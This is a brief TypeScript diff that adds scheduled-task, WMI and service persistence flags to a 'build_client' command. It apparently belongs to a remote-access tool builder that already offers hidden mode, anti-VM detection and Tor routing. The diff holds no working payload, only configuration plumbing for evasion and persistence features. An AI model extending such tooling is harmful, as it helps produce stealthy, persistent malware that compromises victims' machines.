@@ -31,7 +31,10 @@ export const buildClientCmd = async (
   enableHidden: boolean,
   antiVmDetection: boolean,
   useTor: boolean,
-  torAddress: string
+  torAddress: string,
+  persistenceSchtasks: boolean,
+  persistenceWmi: boolean,
+  persistenceService: boolean
 ): Promise<void> => {
   return invoke("build_client", {
     ip,
@@ -50,6 +53,9 @@ export const buildClientCmd = async (
     antiVmDetection,
     useTor,
     torAddress,
+    persistenceSchtasks,
+    persistenceWmi,
+    persistenceService,
   });
 };
 
